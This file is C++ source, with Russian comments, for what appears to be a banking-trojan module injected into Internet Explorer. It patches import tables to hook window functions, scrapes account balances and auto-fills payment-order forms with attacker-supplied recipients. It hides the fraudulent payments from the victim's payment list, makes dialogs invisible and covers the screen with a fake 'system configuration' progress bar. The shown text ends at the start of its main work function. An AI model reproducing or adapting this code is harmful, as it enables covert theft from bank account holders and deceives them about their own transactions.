#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"

#include "Utils.h"
#include "WndUtils.h"

#include "Inject.h"
#include "ntdll.h"
#include "commctrl.h"
#include "BotDebug.h"
#include "BotHTTP.h"

namespace DBGRAFADLL
{
	#include "DbgTemplates.h"
}

#define DBGRAFA DBGRAFADLL::DBGOutMessage<>

#define RafaDllModule //говорим что модуль включен

namespace Rafa
{

LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);

WNDPROC MainWndProc; //оконная процедура главного окна клиента


//контрол формы, для автоматического заполнения формы данными
struct ControlForm
{
	const char* name; //условное имя контрола, для его идентификации в программе
	int x, y, w, h; //расположение контрола на форме (для поиска, изменять нельзя)
	const char* captionText;
	DWORD captionHash; //если хеш не указан, то ищем по captionText
	const char* classText;
	DWORD classHash;
};

//информация он найденном контроле
struct ControlFinded
{
	HWND wnd;
	ControlForm* info;
};

struct PaymentOrder
{
	char* sendAcc; //счет отправителя
	char* sum; //сумма
	char* inn;
	char* bik;
	char* recvAcc; //счет получателя
	char* recvName; //название получателя
	char* comment; //назначение платежа
	char* bankName; //наименование банка получателя
	char* bankCity; //город банка получателя
	char* bankAcc; //счет банка получателя
	bool entered; //платежка проведена (введена)
	char  mem[1024]; //память для данных, сюда ссылаются указатели выше
};

//найденный счет и его баланс
struct AccountBalans
{
	char acc[24]; //найденный счет
	char balans[24]; //остаток на счету
};

//найденный аккаунт в дереве
struct TreeAccount
{
	char acc[24]; //номер счета
	HTREEITEM itemAcc; //ветка счета
	HTREEITEM itemTmpls; //ветка шаблонов
};

static void GrabBalansFromMemoText(const char* s);
static void GrabBalansFromLVM( int cln, const char* s );
static void LoadPaymentOrders(); //загрузка проведенных платежек из файла, чтобы их потом скрывать
static void SavePaymentOrders(); //сохранение платежек
static PaymentOrder* GetPaymentOrders(); //запрос новой платежки в админке

HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
DWORD PID = 0; //для избежания 2-го запуска
char LVM_Acc[32]; //найденный счет в таблице
int fromLVM = 0;  //если равно 1, то передаем цифру в админку (см. функцию GrabBalansFromLVM)
HWND treeView = 0, listView = 0, toolBar = 0;
int idBtNewDoc = 0;
POINT posBtNewDoc;
int stateFakeWindow = 0;
PaymentOrder* paymentOrders = 0; //платежные поручения
int c_paymentOrders = 0; //количество скрываемых (полученных) платежек
AccountBalans findedBalans[8]; //найденный счета с балансами
int c_findedBalans = 0; //количество найденных счетов

//переменные для скрытия платежек
int lvRows[100]; //номера строк платежек для скрытия введеной нами, при идентификации нашей платежки ее номер будет переброш в конец массива, и последнии строки не будут отображатся
int c_lvRows = 0; //количество строк в lvRows, определяется по сообщению LVM_INSERTITEM
int begHideRows = 0; //с какой строки начинаются невидимые строки
int identHidePayment = 0; //флаги: 1 - совпал получатель, 2 - совпала сумма, 4 - совпало назначение
const int fullIdent = 1 + 2 + 4; //при этом значении считаем, что наша платежка идентифицирована

//контролы формы "Платежное поручение"
ControlForm controlsPaymentOrder[] = 
{
	{ "form",	 0, 0, 606, 569,  "Платёжное поручение", 0x505B8A7A, "Canvas",  0 },
	{ "num",	 168, 0, 50, 25,  0,					 0,			 0,			0xCB934F4 /* edit */}, //номер документа
	{ "express", 169, 29, 67, 16, 0,					 0xEEFB4590 /* срочный */, 0, 0x5E9D34F9 /* button */}, //галочка срочный
	{ "date",	 238, 1, 82, 24,  0,					 0,          0,         0xD3CC2481 /* sysdatetimepick32 */ }, //дата
	{ "typepayment", 339, 1, 102, 302, 0,                0,          0,			0x2D3F0896 /* combobox */}, //вид платежа
	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //статус составителя
	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //ИНН плательщика
	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП плательщика
	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //сумма
	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* НДС */, 0, 0x5E9D34F9 /* button */}, //кнопка НДС
	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //ИНН получателя
	{ "kpprecv", 240, 234, 87, 27, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП получателя
	{ "accountrecv", 415, 234, 154, 25,	0,				 0,          0,         0xCB934F4 /* edit */}, //счет получателя
	{ "namerecv", 91, 262, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //наименование получателя
	{ "bikrecv", 415, 262, 154, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //БИК получателя
	{ "bankrecv", 91, 288, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //банк получателя
	{ "accbankrecv", 415, 288, 154, 25, 0,               0,          0,         0xCB934F4 /* edit */}, //счет банка получателя
	{ "punktrecv", 111, 314, 217, 25, 0,				 0,          0,         0xCB934F4 /* edit */}, //населенный пункт получателя
	{ "daterecv", 486, 315, 82, 24, 0,                   0,			 0,			0xD3CC2481 /* sysdatetimepick32 */ }, //дата исполнения
	{ "queue",    475, 343, 93, 210, 0,					 0,			 0,			0x2D3F0896 /* combobox */}, //очередь платежа
	{ "comment",  9, 408, 579, 97, 0,					 0,          0,         0xCB934F4 /* edit */}, //назначение платежа
	{ "save",     415, 511, 75, 25, 0,					 0x23981105 /* Сохранить */, 0, 0x5E9D34F9 /* button */}, //кнопка сохранить
	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* К отправке */, 0, 0x5E9D34F9 /* button */}, //галочка к отправке
	{ 0 }
};


//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf );

static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
{
  PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(  ((PIMAGE_DOS_HEADER)Image)->e_lfanew +  (PCHAR)Image );
  if ( 	((PIMAGE_DOS_HEADER)Image)->e_magic != IMAGE_DOS_SIGNATURE )
	  return NULL;
  if ( pNtHeader->Signature != IMAGE_NT_SIGNATURE )
	  return NULL;
  return pNtHeader;
};

static bool PathIAT(PVOID Module,PCHAR DllName,PCHAR FuncName,PVOID NewHandler,PVOID *OldHandler)
{

	PIMAGE_NT_HEADERS		pNtHeader;
	PIMAGE_DATA_DIRECTORY	pData;
	CHAR buf1[MAX_PATH];

	if ( Module == NULL )
		return false;

	pNtHeader = GetNtHeaders(Module);
	if ( pNtHeader == NULL )
		return false;

	pData = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if ( pData->Size == 0 )
		return false;
	
	m_lstrcpy(buf1,DllName);
	pCharUpperBuffA(buf1,sizeof(buf1)-1);

	PIMAGE_IMPORT_DESCRIPTOR	pimg_import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)Module + pData->VirtualAddress);

	for ( int i =0; pimg_import_desc[i].Name != 0; ++i)
	{
		CHAR buf2[MAX_PATH];
		PCHAR ImortDll = (PCHAR)Module + pimg_import_desc[i].Name;
		m_lstrcpy(buf2,ImortDll);
		pCharUpperBuffA(buf2,sizeof(buf2)-1);
		if ( m_lstrcmp(buf1,buf2) != 0 )
			continue;

		DWORD  VAToThunk   = pimg_import_desc[i].FirstThunk;
		PDWORD FirstThunk  = (PDWORD)((PCHAR)Module + pimg_import_desc[i].FirstThunk);  /*VA to function*/
		PDWORD OriginalFirstThunk  =(PDWORD)((PCHAR)Module + pimg_import_desc[i].OriginalFirstThunk); /*VA to name function*/
		while ( *FirstThunk  && *OriginalFirstThunk )
		{
			PCHAR Name  = (PCHAR)((PCHAR)Module +*OriginalFirstThunk ); 
			Name+=2;

			if ( m_lstrcmp(Name,FuncName) == 0)
			{
				DWORD Protect;
				*OldHandler = (PVOID)*FirstThunk;
				pVirtualProtect(FirstThunk,sizeof(PVOID),PAGE_READWRITE,&Protect);
				*FirstThunk = (DWORD)NewHandler;
				pVirtualProtect(FirstThunk,sizeof(PVOID),Protect,&Protect);

				
				DBGRAFA( "Rafa", "IAT: [%s] %x", FuncName, *FirstThunk); 
				return true;
			}

			FirstThunk++;	OriginalFirstThunk++;
			VAToThunk += sizeof(VAToThunk);
		}
	}
	return false;
}

static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	switch ( Msg )
	{
		// весь остальной текст в том числе и из EDIT (в правом нижнем углу)
		case WM_SETTEXT:
			//DBGRAFA( "Rafa", "SETTEXT: [%x] %s", hWnd, lParam ); 
			GrabBalansFromMemoText((char*)lParam);
		break;

		// для дерева добавление item
		case TVM_INSERTITEM:
		{
			/*
			LPTVINSERTSTRUCT insert = (LPTVINSERTSTRUCT)lParam;
			if ( insert)
			if ( insert->item.mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_INSERTITEM: [%x] %s", hWnd, (insert->item.pszText==NULL)?"NULL":insert->item.pszText); 
			}
			*/
			break;
		}
		// для дерева модификация item
		case TVM_SETITEM:
		{
			/*
			LPTVITEM	item  = (LPTVITEM)lParam;
			if ( item )
			if ( item->mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_SETITEM: [%x] %s",hWnd,(item->pszText==NULL)?"NULL":item->pszText); 
			}
			*/
			break;
		}

		// для таблицы добавление item
		case LVM_INSERTITEM:
		{
			LPLVITEM item = (LPLVITEM)lParam;
			if ( item == NULL)
				break;
			if ( item->mask & LVIF_TEXT && item->pszText != LPSTR_TEXTCALLBACK )
			{
				//DBGRAFA( "Rafa++++", "i = %d,%d, '%s'", item->iItem, item->iSubItem, item->pszText );
			}
			//строим таблицу порядка отображаемых строк
			begHideRows = c_lvRows = item->iItem + 1;
			lvRows[item->iItem] = item->iItem;
			break;
		}
		// для таблицы  модификация item
		case LVM_SETITEM:
		{
			LPLVITEM item  = (LPLVITEM)lParam;
			if( item )
				if ( item->mask & LVIF_TEXT )
				{
					//DBGRAFA( "Rafa", " %s", item->pszText ); 
					GrabBalansFromLVM( item->iSubItem, item->pszText );
				}
			break;
		}
	}

	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);
}

static bool FindPaymentForIdent( const char* s, int id )
{
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		char* s2 = 0;
		switch( id )
		{
			case 0: s2 = paymentOrders[i].recvName; break;
			case 1: s2 = paymentOrders[i].sum; break;
			case 2: s2 = paymentOrders[i].comment; break;
		}
		if( s2 == 0 ) break;
		if( m_strstr( s, s2 ) ) return true;
	}
	return false;
}

static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	int iRealItem;
	switch( Msg )
	{
		case WM_NOTIFY:
		{
			NMHDR* pdi = (NMHDR*)lParam;
			if( pdi->hwndFrom == listView )
			{
				NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
				if( pdi->code == LVN_GETDISPINFO )
				{
					//перекодируем номер строки
					iRealItem = p->item.iItem;
					p->item.iItem = lvRows[iRealItem];
				}
			}
			break;
		}
	}
	LRESULT ret = MainWndProc( hWnd, Msg, wParam, lParam );
	switch ( Msg )
	{
		case WM_NOTIFY:
		{
			//через сообщение LVN_GETDISPINFO ListView запрашивает данные для ячеек, в которых отображаются платежки
			//здесь идентифицируем платежки которые нужно скрыть
			NMHDR* pdi = (NMHDR*)lParam;
			if( pdi->hwndFrom == listView )
			{
				if( pdi->code == LVN_GETDISPINFO )
				{
					NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
					if( p->item.mask & LVIF_TEXT )
					{
						switch( p->item.iSubItem )
						{
							case 5: //получатель
								if( FindPaymentForIdent( p->item.pszText, 0 ) )
									identHidePayment |= 1;
								else
									identHidePayment = 0; //если не совпало, то обнуляем полностью идентификацию
								break;
							case 4: //сумма
								if( FindPaymentForIdent( p->item.pszText, 1 ) )
									identHidePayment |= 2;
								else
									identHidePayment = 0; 
								break;
							case 6: //назначение
								if( FindPaymentForIdent( p->item.pszText, 2 ) )
									identHidePayment |= 4;
								else
									identHidePayment = 0; 
								break;
						}
						if( identHidePayment == fullIdent ) //наша платежка идентифицирована
						{
							DBGRAFA( "Rafa", "Идентифицировали платежку %d", iRealItem );
							//ищем индекс платежки в нашем массиве
							int idx = -1;
							for( int i = 0; i < c_lvRows; i++ )
								if( lvRows[i] == iRealItem )
								{
									idx = i;
									break;
								}
							if( idx < begHideRows ) //платежка еще не скрыта
							{
								//переносим номер этой платежки в самый низ, остальные поднимаем выше
								int num = lvRows[idx]; //запомнили порядковый номер платежки
								for( int i = idx; i < c_lvRows - 1; i++ )
									lvRows[i] = lvRows[i + 1];
								begHideRows--;
								lvRows[c_lvRows - 1] = num;
							}
							identHidePayment = 0;
							pUpdateWindow(listView); //обновляем таблицу
						}
						//DBGRAFA( "Rafa*****", "i = %d,%d '%s'", p->item.iItem, p->item.iSubItem, p->item.pszText );
					}
				}
				if( pdi->code == NM_CUSTOMDRAW )
				{
					NMLVCUSTOMDRAW* p = (NMLVCUSTOMDRAW*)lParam;
					if( p->nmcd.dwDrawStage == CDDS_PREPAINT )
					{
						ret |= CDRF_NOTIFYITEMDRAW;
					}
					if( p->nmcd.dwDrawStage == CDDS_ITEMPREPAINT ) 
					{
						if( p->nmcd.dwItemSpec >= (DWORD)begHideRows ) //запрещаем рисовать нашу платежку
							ret = CDRF_SKIPDEFAULT;
						else
							ret = CDRF_NEWFONT;
					}
				}
			}
			break;
		}
	}
	return ret;
}

static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, PCHAR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam )
{
	HWND hWnd = pHandlerCreateWindowExA( dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, 
										 hWndParent, hMenu, hInstance, lpParam );
	
	if( hWnd && (DWORD)lpClassName > 0x10000 && lpWindowName )
	{
		bool transparent = false;
		if( (stateFakeWindow & 3) == 3 ) //ждем появления окна ввода новой платежки
		{
			RECT r;
			if( CmpWnd( lpWindowName, 0, lpClassName, 0, r, &controlsPaymentOrder[0] ) ) //это окно Платёжное поручение
			{
				transparent = true;
				stateFakeWindow &= ~2; //больше не нужно ждать это окно
			}
		}
		else
			if( (stateFakeWindow & 5) == 5 ) //во время ввода платежки, подавляем все всплывающие окна
			{
				transparent = true;
			}
		if( transparent ) //делаем окно прозрачным
		{
#ifdef DEBUGCONFIG
			SetWindowTransparent( hWnd, 50 );
#else
			SetWindowTransparent( hWnd, 0 );
#endif
		}
	}
	return hWnd;
}

static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
{
	DWORD hash = GetWndClassHash(wnd);
	if( pIsWindowVisible(wnd) )
	{
		if( hash == 0xEB4973EE /* SysTreeView32 */ )
		{
			treeView = wnd;
		}
		if( hash == 0xF06537E2 /* SysListView32 */ )
		{
			listView = wnd;
		}
		if( hash == 0xC1AFE727 /* ToolbarWindow32 */ )
		{
			TBBUTTON bt;
			for( int i = 0; i < 20; i++ )
			{
				m_memset( &bt, 0, sizeof(bt) );
				if( pSendMessageA( wnd, TB_GETBUTTON, (WPARAM)i, (LPARAM)&bt ) == FALSE ) break;
				char text[128];
				pSendMessageA( wnd, TB_GETBUTTONTEXT, (WPARAM)bt.idCommand, (LPARAM)text );
				if( CalcHash(text) == 0x8CBC9350 /* Новый документ */ )
				{
					toolBar = wnd;
					idBtNewDoc = bt.idCommand;
					DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
					RECT r;
					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
					posBtNewDoc.x = r.left;
					posBtNewDoc.y = r.top;
					break;
				}
			}
		}
	}
	return TRUE;
}

static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == (DWORD)lParam )
	{
		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //окно ИЕ в текущем процессе
		{
			IEWnd = wnd; //запоминаем окно ИЕ
			EnumChildWindows( wnd, EnumTreeList, 0 ); //ищем в дочерних нужные нам контролы
			if( treeView && listView ) //нашли нужные контролы (дерево слева и таблицу справа сверху)
			{
				return FALSE; //останавливаем поиск
			}
		}
	}
	return TRUE;
}

//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf )
{
	bool ok = false;
	//окно нужного класса
	if( cf->classHash && classHash ) //есть хеш имени класса, сравниваем по нему
	{
		if( classHash == cf->classHash )
			ok = true;
	}
	else 
	{
		if( cf->classText ) //есть имя класса, сравниваем по имени
		{
			if( className )
			{
				if( m_strstr( className, cf->classText ) )
					ok = true;
			}
		}
	}
	if( ok ) //класс окна совпал
	{
		ok = false;
		//сравнимаем по заголовку окна
		if( cf->captionHash && captionHash ) //есть хеш заголовка
		{
			if( captionHash == cf->captionHash )
				ok = true;
		}
		else
		{
			if( cf->captionText && caption ) //есть текст заголовка
			{
				if( m_strstr( caption, cf->captionText ) )
					ok = true;
			}
			else //заголовок не указан, сравниваем по координатам
			{
				int right = cf->x + cf->w - 1, bottom = cf->y + cf->h - 1;
				if( cf->x <= r.right && right >= r.left && cf->y <= r.bottom && bottom >= r.top )
					ok = true;
			}
		}
		if( ok ) //параметры окна совпали
			return true;
	}
	return false;
}

static void GetControlRect( HWND parent, HWND wnd, RECT& r )
{
	pGetWindowRect( wnd, &r );
	//преобразовываем в координаты окна предка
	POINT p;
	p.x = r.left; p.y = r.top;
	pScreenToClient( parent, &p );
	r.right = p.x + r.right - r.left;
	r.bottom = p.y + r.bottom - r.top;
	r.left = p.x;
	r.top = p.y;
}

static bool CmpWnd( HWND parent, HWND wnd, ControlForm* cf )
{
	char* caption = GetWndText(wnd);
	char* className = GetWndClassName(wnd);
	RECT r;
	GetControlRect( parent, wnd, r );
	bool res = CmpWnd( caption, CalcHash(caption), className, STR::GetHash( className, 0, true ), r, cf );
	STR::Free(caption);
	STR::Free(className);
	return res;
}

//-----------------------------------------------------------------
//вспомогательная функция для поиска форм на окне ИЕ
static BOOL CALLBACK EnumFindForm( HWND wnd, LPARAM lParam )
{
	DWORD pid = 0;
	pGetWindowThreadProcessId( wnd, &pid );
	if( pid == PID )
	{
		ControlFinded* cf = (ControlFinded*)lParam;
		if( CmpWnd( wnd, wnd, cf->info ) )
		{
			cf->wnd = wnd;
			return FALSE;
		}
	}
	return TRUE;
}

//ищет нужную нам форму в дочерних окнах ИЕ
static HWND FindForm( ControlForm* form )
{
	ControlFinded cf;
	cf.wnd = 0;
	cf.info = form;
	pEnumChildWindows( 0 /*IEWnd*/, EnumFindForm, (LPARAM)&cf );
	return cf.wnd;
}
//--------------------------------------------------------------------------
struct ForFindControls
{
	ControlForm* cfIn;
	ControlFinded* cfOut;
	int countOut; //сколько найдено
	HWND parent;
};

//вспомогательная функция для поиска контролов на форме
static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
{
	if( pIsWindowVisible(wnd) )
	{
		ForFindControls* ffc = (ForFindControls*)lParam;
		ControlForm* pcf = ffc->cfIn;
		char* caption = GetWndText(wnd);
		char* className = GetWndClassName(wnd);
		DWORD captionHash = CalcHash(caption);
		DWORD classHash = STR::GetHash( className, 0, true );
		RECT r;
		GetControlRect( ffc->parent, wnd, r );

		DBGRAFA( "Rafa", "%s %s", caption, className );
		while( pcf->name )
		{
			if( CmpWnd( caption, captionHash, className, classHash, r, pcf ) )
			{
				//на всякий случай смотрим, чтобы по одному описанию не нашлю несколько окон
				int i = 0;
				for( ; i < ffc->countOut; i++ )
					if( ffc->cfOut[i].info == pcf )
						break;
				if( i >= ffc->countOut )
				{
					ffc->cfOut[ffc->countOut].info = pcf;
					ffc->cfOut[ffc->countOut].wnd = wnd;
					ffc->countOut++;
					DBGRAFA( "Rafa", "finded %s", pcf->name );
					break;
				}
			}
			pcf++;
		}

		STR::Free(caption);
		STR::Free(className);
	}
	return TRUE;
}

//ищет контролы на форме parent по описанию в массиве cfIn, результат записывается в cfOut и возвращает функция количество найденных
//контролов. Массив cfOut должен выделен на тоже количество элементов что и cfIn
static int FindControls( HWND parent, ControlForm* cfIn, ControlFinded* cfOut )
{
	ForFindControls ffc;
	ffc.cfIn = cfIn;
	ffc.cfOut = cfOut;
	ffc.countOut = 0;
	ffc.parent = parent;
	pEnumChildWindows( parent, EnumFindControls, (LPARAM)&ffc );
	return ffc.countOut;
}

//------------------------------------------------------------------------------------------------------------

static bool FindTreeList()
{
	treeView = listView = 0;
	DWORD pid = GetUniquePID();
	pEnumWindows( EnumTopWindows, (LPARAM)pid );
	if( treeView && listView )
		return true;
	return false;
}

static char* GetTextTreeItem( HTREEITEM item, char* buf, int szBuf )
{
	TVITEMEX infoItem;
    m_memset( &infoItem, 0, sizeof(infoItem) );
    infoItem.mask = TVIF_TEXT | TVIF_HANDLE;
    infoItem.hItem = item;
    infoItem.pszText = buf;
    infoItem.cchTextMax = szBuf;
    buf[0] = 0;
    if( pSendMessageA( treeView, TVM_GETITEM, (WPARAM)0, (LPARAM)&infoItem ) )
		return buf;
	return 0;
}

//ищем "платежное поручение"->"Шаблоны", возвращаем item Шаблоны
static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* itemAccs, int c_itemAccs )
{
	char text[256];
	do
	{
		if( pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_EXPAND, (LPARAM)item ) )
		{
			HTREEITEM child = 0;
			//после разворачивания дерева, ветки могут не сразу появиться, поэтому ждем пока появятся
			for( int i = 0; i < 20; i++ )
			{
				child = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_CHILD, (LPARAM)item );
				if( child != 0 ) break;
				pSleep(500);
			}
			if( child )
			{
				if( GetTextTreeItem( item, text, sizeof(text) ) )
				{
					DWORD hash = CalcHash(text);
					if( hash == 0x505B8B0E /* Платежное поручение */ ) //нужная ветка
					{
						//смотрим есть ли в подветках Шаблоны
						HTREEITEM item2 = child;
						do
						{
							if( GetTextTreeItem( item2, text, sizeof(text) ) )
							{
								if( m_strstr( text, "Шаблоны" ) )
								{
									//itemPrev - это ветка с номеров счета
									//выбераем ветку с номером счеиа, чтобы сграбился в хуках баланс
									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemPrev );
									//запоминаем нужные нам ветки счета
									GetTextTreeItem( itemPrev, itemAccs[c_itemAccs].acc, sizeof(itemAccs[c_itemAccs].acc) );
									itemAccs[c_itemAccs].itemAcc = itemPrev;
									itemAccs[c_itemAccs].itemTmpls = item2;
									DBGRAFA( "Rafa", "Find tree item %s", itemAccs[c_itemAccs].acc );
									return ++c_itemAccs;
								}
							}
							item2 = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item2 );
						}
						while(item2);
					}
				}
				c_itemAccs = FindPaymentOrder( child, item, itemAccs, c_itemAccs );
			}
		}
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item );
	} while( item );
	return c_itemAccs;
}

//сворачивает указанное количество веток дерева
static void TreeViewCollapse( HTREEITEM item, int count )
{
	while( count-- )
	{
		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_PARENT, (LPARAM)item );
		if( item == 0 ) break;
		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
	}
}

static int FindNewPaymentOrder()
{
	int index = -1;
	char text[256];
	for(;;)
	{
		index = (int)pSendMessageA( listView, LVM_GETNEXTITEM, (WPARAM)index, MAKELPARAM(LVNI_ALL, 0) );
		if( index < 0 ) break;
		LVITEM item;
		m_memset( &item, 0, sizeof(item) );
		item.pszText = text;
		item.cchTextMax = sizeof(text);
		item.iSubItem = 6; //именно в 6-м находится наименование шаблона
		text[0] = 0;
		pSendMessageA( listView, LVM_GETITEMTEXT, (WPARAM)index, (LPARAM)&item );
		DWORD hash = CalcHash(text);
		DBGRAFA( "Rafa", "ListView %d, '%s'", index, text );
		if( hash == 0x6C433B30 /* НОВОЕ ПЛАТЕЖНОЕ ПОРУЧЕНИЕ */ )
		{
			break;
		}
	}
	return index;
}

//ищет контрол среди найденых на форме по его имени
static ControlFinded* GetControl( const char* name, ControlFinded* cf, int count )
{
	for( int i = 0; i < count; i++ )
	{
		if( m_lstrcmp( name, cf[i].info->name ) == 0 )
			return &cf[i];
	}
	return 0;
}

//пишет текст в контрол на форме
static bool SetText( const char* name, const char* s, ControlFinded* cf, int count, const char* sendChars = 0 )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		if( s )
			pSetWindowTextA( ctrl->wnd, s );
		if( sendChars )
		{
			while( *sendChars )
			{
				SendMessageA( ctrl->wnd, WM_CHAR, (WPARAM)*sendChars, (LPARAM)0 );
				sendChars++;
			}
		}
		return true;
	}
	return false;
}

static bool SetButtonCheck( const char* name, bool check, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		pSendMessageA( ctrl->wnd, BM_SETCHECK, (WPARAM) check ? BST_CHECKED : BST_UNCHECKED, (LPARAM)0 );
		return true;
	}
	return false;
}

static bool ClickButton( const char* name, ControlFinded* cf, int count )
{
	ControlFinded* ctrl = GetControl( name, cf, count );
	if( ctrl )
	{
		HardClickToWindow( ctrl->wnd, 5, 5 );
		return true;
	}
	return false;
}

//Создает окно с прогресс баром, которое скрывает под собой все окна
static DWORD WINAPI FakeWindow( LPVOID p )
{
	HWND parent = (HWND)p;
	HINSTANCE inst = (HINSTANCE)pGetModuleHandleA(NULL);
	RECT r, r2;
	pGetClientRect( parent, &r ); //область которую нужно закрыть
	POINT pp;
	pp.x = 0;
	pp.y = 0;
	//узнаем координаты области на экране
	pClientToScreen( parent, &pp ); 
	int xFW = pp.x, yFW = pp.y;
	int wFW = r.right, hFW = r.bottom;
	//рассчитываем положение прогресс бара на новом окне
	int wPB = r.right * 80 / 100;
	int hPB = 25;
	int xPB = (r.right - wPB) / 2;
	int yPB = (r.bottom - hPB) / 2;
	//создаем скрывающее окно
	HWND fakeWindow = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_CHILD | WS_POPUP, xFW, yFW, wFW, hFW, parent, NULL, inst, NULL );

	if( !fakeWindow )
      return 0; 
	//окно в котором печатается текст
	HWND warnWnd = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
	//сам текст пишем в статус баре, чтобы был нормальный фон и цвет текста
	HWND warnText = (HWND)pCreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
	//статус бар справа рисует треугольник, это окно его скрывает
	HWND warnWnd2 = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
	//создаем сам прогресс бар
	HWND progressBar = (HWND)pCreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );

	pShowWindow( fakeWindow, SW_SHOW );
	pUpdateWindow(fakeWindow);
	//устанавливаем таймер для инкримента в статус баре
	pSetTimer( fakeWindow, 1, 500, 0 );
	//настраиваем статус бар
	pSendMessageA( progressBar, PBM_SETRANGE, 0, MAKELPARAM( 0, 60 )); 
	pSendMessageA( progressBar, PBM_SETSTEP, (WPARAM) 1, 0 );
	MSG msg;
	int remain = 60;
	//запоминаем положение окна
	pGetWindowRect( parent, &r2 );
	r.left = r2.left;
	r.top = r2.top;
	r.right = r2.right;
	r.bottom = r2.bottom;

	//прогоняем в потоке сообщения и реагируем только на свой таймер
	while( (stateFakeWindow & 1) && pGetMessageA( &msg, 0, 0, 0 ) )
	{
		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow ) //наш таймер
		{
			pSendMessageA( progressBar, PBM_STEPIT, 0, 0 ); 
			//if( --remain == 0 )
			//	break;
		}
	    pTranslateMessage( &msg );
		pDispatchMessageA( &msg );
		//проверяем не изменило ли свое положение или размеры окно которое скрываем
		pGetWindowRect( parent, &r2 );
		if( r.left != r2.left || r.top != r2.top || r.right != r2.right || r.bottom != r2.bottom )
		{
			//если изменило, то подгоняем наше окно под предка
			r.left = r2.left;
			r.top = r2.top;
			r.right = r2.right;
			r.bottom = r2.bottom;
			pGetClientRect( parent, &r2 );
			pp.x = 0;
			pp.y = 0;
			pClientToScreen( parent, &pp );
			pMoveWindow( fakeWindow, pp.x, pp.y, r2.right, r2.bottom, TRUE );
		}
	}
	pDestroyWindow(fakeWindow);
	return true;
}

//сюда попадаем когда найдены контролы TreeView и ListView окна банка
static void WorkInRafa()
